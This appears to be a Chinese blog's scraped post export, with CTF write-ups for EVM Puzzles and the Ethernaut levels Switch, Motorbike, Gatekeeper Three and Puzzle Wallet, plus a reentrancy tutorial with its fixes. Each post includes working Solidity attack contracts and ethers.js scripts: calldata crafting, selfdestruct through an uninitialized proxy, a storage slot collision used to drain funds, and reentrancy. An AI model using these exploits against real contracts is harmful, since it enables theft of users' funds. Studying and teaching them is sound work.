JUMPDEST09 36 CALLDATASIZE0A 610003 PUSH2 00030D 90 SWAP10E 06 MOD0F 15 ISZERO10 34 CALLVALUE11 600A PUSH1 0A13 01 ADD14 57 JUMPI15 FD REVERT16 FD REVERT17 FD REVERT18 FD REVERT19 5B JUMPDEST1A 00 STOP 分析： p1: 1234567800 38 CODESIZE01 34 CALLVALUE02 90 SWAP103 11 GT04 6008 PUSH1 0806 57 JUMPI07 FD REVERT08 5B JUMPDEST CALLVALUE和CODESIZE交换位置，CODESIZE &#x3D; 0x1A &#x3D; 26，要求msg.value &lt; 26。 p2: 12345678909 36 CALLDATASIZE0A 610003 PUSH2 00030D 90 SWAP10E 06 MOD0F 15 ISZERO10 34 CALLVALUE11 600A PUSH1 0A13 01 ADD14 57 JUMPI ISZERO 要求： CALLDATASIEZE % 3 == 0，且msg.value + 0x0a == 0x19 == 25，所以msg.value=15。 故： 12CALLDATASIEZE % 3 == 0;msg.value == 15; 所以： calldata 可为 0x000006 结果： 完结 参考链接 link1，link2","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"EVM Puzzles","slug":"CTFS/EVM-Puzzles","permalink":"https://biyouqiuqiu.com/categories/CTFS/EVM-Puzzles/"}],"tags":[{"name":"EVM_Puzzles","slug":"EVM-Puzzles","permalink":"https://biyouqiuqiu.com/tags/EVM-Puzzles/"}]},{"title":"Switch","slug":"CTFS/ethernaut/Switch ","date":"2023-08-18T10:23:10.000Z","updated":"2023-08-18T10:23:10.000Z","comments":true,"path":"2023/08/18/CTFS/ethernaut/Switch /","link":"","permalink":"https://biyouqiuqiu.com/2023/08/18/CTFS/ethernaut/Switch%20/","excerpt":"","text":"1. 题目1.1 题目 Just have to flip the switch. Can’t be that hard, right? Things that might help:Understanding how CALLDATA is encoded. 1.2 源码 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Switch &#123; bool public switchOn; // switch is off bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;)); modifier onlyThis() &#123; require(msg.sender == address(this), &quot;Only the contract can call this&quot;); _; &#125; modifier onlyOff() &#123; // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly &#123; calldatacopy(selector, 68, 4) // grab function selector from calldata &#125; require( selector[0] == offSelector, &quot;Can only call the turnOffSwitch function&quot; ); _; &#125; function flipSwitch(bytes memory _data) public onlyOff &#123; (bool success, ) = address(this).call(_data); require(success, &quot;call failed :(&quot;); &#125; function turnSwitchOn() public onlyThis &#123; switchOn = true; &#125; function turnSwitchOff() public onlyThis &#123; switchOn = false; &#125;&#125; 2. 分析2.1 本地要将switchOn的值变成true，则必须要调用turnSwitchOn函数，而调用该函数必须要通过修饰器onlyThis，该修饰器要求调用者为本合约，这要求了只能在本合约中通过低级调用call来实现。而flipSwitch函数则提供了这一方法，但要通过修饰器onlyOff。 2.2 解析修饰器onlyOff 12345678910111213modifier onlyOff() &#123; // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly &#123; calldatacopy(selector, 68, 4) // grab function selector from calldata &#125; require( selector[0] == offSelector, &quot;Can only call the turnOffSwitch function&quot; ); _;&#125; 注意calldatacopy(selector, 68, 4)，这里是只读取传递的msg.data第68个字节后4个字节，要求其值等于turnOffSwitch.selector。然后便可以自定义传入的data。 按理来说直接通过实例，传入68+4bytes即可完成的，可是实际上并没有成功 123456function calCalldata() internal view returns(bytes memory) &#123; return abi.encodePacked(onSelector, uint(0), uint(0), offSelector);&#125;function attack() public &#123; switch_.flipSwitch(calCalldata());&#125; 刚开始让我可纳闷了，calldatacopy(selector, 68, 4)的结果不就是bytes4(keccak256(&quot;turnSwitchOff()&quot;))吗，但是就是调用失败。所以只能借助etherjs发送原生calldata来完成。 调用方式为：通过向目的地址发送calldata，智能合约对其解码，要做的是：调用flipSwitch函数，flipSwitch函数调用turnSwitchOn函数，所以就要对calldata进行拼接。 123456789101112// 这是flipSwitch()函数选择器30c13ade // 4bytes// onSelector 的存储位置 0x00 0000000000000000000000000000000000000000000000000000000000000060 // 32+4 bytes// 没用，单纯为了占位置0x20 0000000000000000000000000000000000000000000000000000000000000000 // 36+32 bytes// 存放 offSelector0x40 20606e1500000000000000000000000000000000000000000000000000000000 // 68+32bytes// 记录长度0x60 0000000000000000000000000000000000000000000000000000000000000004 // 存放onSelector0x80 76227e1200000000000000000000000000000000000000000000000000000000 所以，calldata为：0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 其实也可以用智能合约完成： 123456789101112function attack() public &#123; // address(switch_).call(abi.encodeWithSelector(Switch.flipSwitch.selector, calCalldata())); // address(switch_).call(&quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;); address(switch_).call(abi.encodePacked( bytes4(0x30c13ade), bytes32(0x0000000000000000000000000000000000000000000000000000000000000060), bytes32(0x0000000000000000000000000000000000000000000000000000000000000000), bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000), bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000) ));&#125; 且只能以这种方式调用。不能直接address(_switch).call(&quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;)，感觉是解码不了。 参考链接：here 3. 解题方法一，攻击合约 12345678910111213141516171819contract Hack &#123; Switch switch_; constructor(address _switch) &#123; switch_ = Switch(_switch); &#125; function attack() public &#123; address(switch_).call(abi.encodePacked( bytes4(0x30c13ade), bytes32(0x0000000000000000000000000000000000000000000000000000000000000060), bytes32(0x0000000000000000000000000000000000000000000000000000000000000000), bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000), bytes32(0x0000000000000000000000000000000000000000000000000000000000000004), bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000) )); &#125;&#125; 方法二，ethersjs脚本 12345678910111213141516171819202122232425262728import &#123; ethers &#125; from &quot;ethers&quot;;const local_url = &quot;http://127.0.0.1:8545&quot;;const provider = new ethers.JsonRpcProvider(local_url);const privateKey = &quot;0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&quot;;const wallet = new ethers.Wallet(privateKey, provider);const contract_address = &quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;;const data = &quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;;const tx = &#123; to: contract_address, data: data,&#125;;async function sendTransaction() &#123; try &#123; const result = await wallet.sendTransaction(tx); console.log(&quot;transaction success, the hash is =&gt;&quot;, result.hash); &#125; catch (error) &#123; console.error(&quot;transaction fail, the reason is &quot;, error); &#125;&#125;;sendTransaction(); ![image-20230909151052073](Switch &#x2F;image-20230909151052073.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Motorbike","slug":"CTFS/ethernaut/Motorbike","date":"2023-08-17T07:23:10.000Z","updated":"2023-08-17T07:23:10.000Z","comments":true,"path":"2023/08/17/CTFS/ethernaut/Motorbike/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/17/CTFS/ethernaut/Motorbike/","excerpt":"","text":"Motorbike1. 题目要求 1.1 Ethernaut 的摩托车采用全新的可升级发动机设计。 你能启动selfdestruct它的引擎并使摩托车无法使用吗？ 可能有帮助的事情： EIP-1967 UUPS可升级模式 可初始化合约 1.2 题目代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;contract Motorbike &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot &#123; address value; &#125; // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public &#123; require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); &#125; // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual &#123; _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); &#125; // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123; assembly &#123; r_slot := slot &#125; &#125;&#125;contract Engine is Initializable &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot &#123; address value; &#125; function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender; &#125; // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); &#125; // Restrict to upgrader role function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;); &#125; // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal &#123; // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0) &#123; (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); &#125; &#125; // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly &#123; r_slot := _IMPLEMENTATION_SLOT &#125; r.value = newImplementation; &#125;&#125; 2. 分析2.1 本题和上题类似，都是代理模式的题。简单分析可知，Engine是Motorbike的实现类，Motorbike是代理合约，两者都有 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;变量，其目的是为了避免插槽冲突的问题，而代理合约中采用了内联汇编的形式，设置并读取slot0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc插槽的值。 2.2 因为代理合约中采用的是delegatecall的方式进行，所以在代理合约中调用逻辑合约的初始化函数，函数运行的结果作用呢在代理合约中，即逻辑合约中的变量仍然保持着未初始化的状态。 2.3 这样我们就可以自己调用初始化函数，自定义slot0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc插槽的值。又因为_upgradeToAndCall()函数，采用了delegatecall的形式进行函数调用，其运行结果作用于自身，也就意味着，如果函数中有selfdestruct自毁函数的操作，其逻辑合约便会被自毁。 2.4 攻击思路，部署一个具有自毁功能的合约，调用upgradeToAndCall函数设置新的实现合约，并执行自毁函数。 3. 解题攻击合约 123456789101112131415161718192021222324contract Hack &#123; Engine engine; Helper helper; constructor(address _engine) public &#123; engine = Engine(_engine); helper = new Helper(); &#125; function attack() public &#123; engine.initialize(); engine.upgradeToAndCall( address(helper), abi.encodeWithSelector(Helper.kill.selector, msg.sender) ); &#125;&#125;contract Helper &#123; function kill(address payable to) public payable &#123; selfdestruct(to); &#125;&#125; 合约报废","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper Three","slug":"CTFS/ethernaut/Gatekeeper Three","date":"2023-08-17T06:33:10.000Z","updated":"2023-08-17T06:33:10.000Z","comments":true,"path":"2023/08/17/CTFS/ethernaut/Gatekeeper Three/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/17/CTFS/ethernaut/Gatekeeper%20Three/","excerpt":"","text":"Gatekeeper Three1. 题目要求 1.1 应对大门并成为进入者。 可能有帮助的事情： 调用低级函数的返回值。 注意语义。 刷新存储在以太坊中的工作方式 1.2 题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; function trickInit() public &#123; trick = address(this); &#125; function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allowEntrance; SimpleTrick public trick; function construct0r() public &#123; owner = msg.sender; &#125; modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; modifier gateTwo() &#123; require(allowEntrance == true); _; &#125; modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125; function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allowEntrance = true; &#125; &#125; function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125; function enter() public gateOne gateTwo gateThree &#123; entrant = tx.origin; &#125; receive () external payable &#123;&#125;&#125; 2. 分析 解读GatekeeperThree合约 要成功注册，则需要成功调用enter函数，而成功调用的前提是，通过三个“守门员”。 gateOne()：很简单，只要调用者不是EOA账户即可，写一个攻击合约即可。 gateTwo() ：require(allowEntrance == true)，要求成功调用getAllowance函数，这要求猜对SimpleTrick中的密码，智能合约是公开同名的，可以通过脚本来获取智能合约上私有变量的值。 12345678910111213it(&quot;Execution&quot;, async function() &#123; let three_contract = await (await ethers.getContractFactory(&#x27;GatekeeperThree&#x27;, deployer)).deploy(); await three_contract.connect(player); // await three_contract.createTrick(); // 0x0A49D6c8267b21A7cB670fD7544448B76Bfb822b // console.log(&quot;trick = &quot;, await three_contract.trick()); let slot2 = await ethers.provider.getStorage(&quot;0x0A49D6c8267b21A7cB670fD7544448B76Bfb822b&quot;, 2); console.log(`slot2 = $&#123;slot2&#125;`);&#125;); 可以借助脚本获取智能合约上的密码 gateThree()：往合约中转入大于0.001ether的ETH，且在攻击合约中使得回调函数返回的值为false即可。 3. 解题综上，可有攻击合约 12345678910111213141516171819202122232425contract Hack &#123; GatekeeperThree three; SimpleTrick trick; constructor(address payable _three) &#123; three = GatekeeperThree(_three); three.createTrick(); trick = three.trick(); &#125; function attck(uint password) public payable &#123; three.construct0r(); three.getAllowance(password); payable(address(three)).transfer(0.0011 ether); three.enter(); require(three.entrant() == msg.sender, &quot;you are not entering&quot;); &#125; receive() external payable &#123; if (msg.value == 0.001 ether) &#123; revert(); &#125; &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Puzzle Wallet","slug":"CTFS/ethernaut/Puzzle Wallet","date":"2023-08-16T04:10:10.000Z","updated":"2023-08-16T04:10:10.000Z","comments":true,"path":"2023/08/16/CTFS/ethernaut/Puzzle Wallet/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/16/CTFS/ethernaut/Puzzle%20Wallet/","excerpt":"","text":"Puzzle Wallet1. 题目要求 题目要求：成为代理合约中的管理者，即成为PuzzleProxy合约中的admin。 题目代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// SPDX-License-Identifier: MITpragma solidity ^0.8.0;pragma experimental ABIEncoderV2;import &quot;../helpers/UpgradeableProxy-08.sol&quot;;contract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125;&#125;contract PuzzleWallet &#123; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] -= value; (bool success, ) = to.call&#123; value: value &#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125; 2. 分析2.1 这是一道涉及到代理合约的题。本质上proxy合约最主要的函数为，回调函数，该回调函数采用了内联汇编的方式来实现，极大的提高的代码的扩容性。其采用的是delegatecall的方式进行函数调用，因为其调用方式，所以逻辑合约中操作的数据是从代理合约中获取。 2.2 有段时间没碰代理合约了，有点细节还是要注意的。就比如采用delegatecall的调用方式，其代码会被复制到代理合约中，就比如这里，我但是懵了一会。 这里我是模拟题目，我以owner的身份将指定的地址加入到白名单，在PuzzleWallet中查看该地址是否被列入白名单，结果是显示true，但是我通过直接发送calldata的形式，触发代理合约的回调函数，结果显示其未被列入白名单。我当时想了好久，原来是因为，在代理合约中，这些操作不在代理合约中执行过，即该地址在代理合约中未被记录，所以其返回值为false。所以只能在代理合约中执行加入白名单才行。 2.3 又有，该题最本质的漏洞在于，***插槽冲突***。而且，代理模式读取的数据是代理合约中的变量，这一行为意味着，逻辑合约中的一些断言，比如require(msg.sender == owner, &quot;Not the owner&quot;);将不与逻辑合约有关系，其owner的值，实际上是代理合约pendingAdmin的值，只要通过proposeNewAdmin()就可以成为钱包的所有者，可以操作钱包（逻辑合约）。 2.4 同理，只有修改逻辑合约中的变量，便会反作用于代理合约。即调用setMaxBalance()函数，明面上是修改maxBalance实际上是修改PuzzleProxy admin的值。 2.5 所以本题关键在于，成功调用setMaxBalance() 1234function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance;&#125; onlyWhitelisted修饰器，我已经有办法成为钱包的所有者，可以将某一地址添加到白名单之中。最主要的是通过断言require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);。因为在PuzzleProxy 合约中有0.001ether所以要想办法将钱取出来。 2.6 如果是正常按照execute进行取钱的话，是不可能将合约的余额置空的。而multicall函数便可以实现，该函数有一个漏洞，便是不检查自身函数的调用，因为判断判断条件为局部变量，而修改的balances映射则是成员变量，每当调用一个函数，便会开辟一个新的内存空间（以栈的形式），此时函数体中的局部变量就会恢复成默认值。这就是漏洞所在，因为函数检查不能多次调用deposit()，以depositCalled 该变量进行判断，只要进行自身调用，即使之前执行过deposit()函数，但在新·开辟的内存空间中，该值还是false，而且他们修改的值都是成员变量，这意味着，可以简单的实现：存一取多。 通过一个简单的示例验证猜想： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687contract Proxy &#123; mapping(address =&gt; uint256) public balances; address public implementation; constructor(address implementation_)&#123; implementation = implementation_; &#125; fallback() external payable &#123; address _implementation = implementation; assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125;&#125;contract PuzzleWallet &#123; mapping(address =&gt; uint256) public balances; function deposit() external payable &#123; require(address(this).balance &lt;= 1 ether, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function multicall(bytes[] calldata data) external payable &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125;contract Hack &#123; Proxy wallet; bytes[] data1 = new bytes[](1); bytes[] data2 = new bytes[](2); constructor(address payable _wallet) &#123; wallet = Proxy(_wallet); data1[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1); &#125; function attack() public payable &#123; // 将proxy中的余额转走 &#123;value:0.001 ether&#125; (bool success2, ) = address(wallet).call&#123;value:0.001 ether&#125;(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data2)); require(success2, &quot;multicall() is fail&quot;); &#125; function repay() public &#123; selfdestruct(payable(msg.sender)); &#125;&#125; 因为数据在代理合约(Proxy)中加载，所以在其合约中写入balances映射，用于检查是否实现了存一取多。 部署wallet&#x3D;&#x3D;&gt;将wallet传入proxy构造器并部署&#x3D;&#x3D;&gt; 将proxy传入hacker部署,调用attack函数,并支付0.001ether,回到proxy中查看调用者的balances,显示为0.002ether,猜想正确. 3. 解题攻击合约: 12345678910111213141516171819202122232425262728293031323334353637383940contract Hack &#123; PuzzleProxy proxy; bytes[] data1 = new bytes[](1); bytes[] data2 = new bytes[](2); constructor(address payable _proxy) &#123; proxy = PuzzleProxy(_proxy); data1[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1); &#125; function attack() public payable &#123; // 获取钱包的所有权 proxy.proposeNewAdmin(address(this)); // 将本地址列入白名单 (bool success1, ) = address(proxy).call(abi.encodeWithSignature(&quot;addToWhitelist(address)&quot;, address(this))); require(success1, &quot;addToWhitelist() is fail&quot;); // 骗取balance的值 (bool success2, ) = address(proxy).call&#123;value:0.001 ether&#125;(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data2)); require(success2, &quot;multicall() is fail&quot;); // 将proxy中的余额转走 (bool success4, ) = address(proxy).call(abi.encodeWithSelector(PuzzleWallet.execute.selector, address(this), 0.002 ether, &quot;&quot;)); // 获取admin身份 (bool success3, ) = address(proxy).call(abi.encodeWithSignature(&quot;setMaxBalance(uint256)&quot;, uint(uint160(msg.sender)))); require(success3, &quot;setMaxBalance() is fail&quot;); &#125; function repay() public &#123; selfdestruct(payable(msg.sender)); &#125; receive() external payable &#123;&#125;&#125; 攻击方式:通过生成的示例部署Hack,然后调用attack()函数,并支付0.001ether 解题成功","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"基础漏洞","slug":"Basic_Knowledge/solidity/基础漏洞","date":"2023-07-28T07:47:10.000Z","updated":"2023-07-28T07:47:10.000Z","comments":true,"path":"2023/07/28/Basic_Knowledge/solidity/基础漏洞/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/28/Basic_Knowledge/solidity/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"1. 重入攻击 📌 重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币。 1.1 复现Bank.sol 123456789101112131415161718192021222324contract Bank &#123; mapping (address =&gt; uint256) public balanceOf; // 记录账户余额 constructor() payable &#123;&#125; // 存款 function deposit() external payable &#123; balanceOf[msg.sender] += msg.value; &#125; // 取款，默认一次性取完 function withdraw() external &#123; uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;balance is null&quot;); (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;); require(success, &quot;withdraw is fail&quot;); balanceOf[msg.sender] = 0; &#125; function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; Hacker.sol 1234567891011121314151617181920212223contract Hacker &#123; Bank bank; constructor(address _bank) &#123; bank = Bank(_bank); &#125; function attack() external payable &#123; bank.deposit&#123;value: msg.value&#125;(); bank.withdraw(); &#125; receive() external payable &#123; if (bank.getBalance() &gt; 0) &#123; bank.withdraw(); &#125; &#125; function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; 分析 当 Hacker调用 attack函数时，先执行存款操作，很正常，但是当执行到取款操作时，(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;)这行代码旨在给调用者转账，调用者中的回退函数会被默认执行，但是在 Hacker合约中，receive回退函数中又去调用了取钱操作，取钱操作的逻辑无法继续往下进行，调用者的账户余额无法得到更新，从而使得银行误以为 require(balance &gt; 0, &quot;balance is null&quot;);是正确的，所以一直执行(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;)，直到银行中的余额被盗取空为止。 执行逻辑 部署Bank合约，转入20 ETH。 切换到攻击者钱包，部署Hacker合约。 调用Hacker合约的attack()函数发动攻击，调用时需转账1 ETH。 调用Bank合约的getBalance()函数，发现余额已被提空。 调用Hacker合约的getBalance()函数，可以看到余额变为21 ETH，重入攻击成功。 1.2 预防 📌 目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁 检查-影响-交互模式 检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将Bank合约withdraw()函数中的更新余额提前到转账ETH之前，就可以修复漏洞： 123456789function withdraw() external &#123; uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;Insufficient balance&quot;); // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。 balanceOf[msg.sender] = 0; (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;); require(success, &quot;Failed to send Ether&quot;);&#125; 重入锁 